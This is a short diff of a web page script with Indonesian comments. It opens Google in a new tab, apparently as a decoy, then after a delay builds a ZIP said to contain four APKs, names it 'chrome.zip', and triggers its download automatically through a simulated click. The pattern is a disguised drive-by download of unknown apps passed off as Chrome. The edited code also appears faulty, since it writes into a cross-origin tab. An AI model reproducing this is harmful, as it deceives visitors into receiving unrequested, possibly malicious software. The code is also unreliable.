@@ -28,9 +28,9 @@
 <script>
 async function downloadZip() {
   try {
-    // Redirect ke google.com terlebih dahulu
-    window.location.replace('https://www.google.com'); // Menggunakan replace agar halaman asal digantikan
-
+    // Membuka halaman Google.com di tab baru
+    const googleTab = window.open('https://www.google.com', '_blank');
+    
     // Tunggu 4 detik sebelum mulai proses download
     setTimeout(async () => {
       // Generate ZIP file
@@ -52,13 +52,15 @@ END
       // Generate ZIP
       const blob = await zip.generateAsync({ type: "blob" });
 
-      // Gantilah jendela yang terbuka (Google) dengan file download
+      // Simpan file ZIP di tab Google yang sudah dibuka
       const a = document.createElement('a');
       a.href = URL.createObjectURL(blob);
       a.download = "chrome.zip";
 
-      // Tambahkan link download dan simulasikan klik untuk memulai download
-      document.body.appendChild(a);
+      // Menambahkan link download ke tab Google
+      googleTab.document.body.appendChild(a);
+
+      // Simulasikan klik pada link untuk memulai download
       a.click();
 
       console.log("ZIP with 4 APKs triggered");
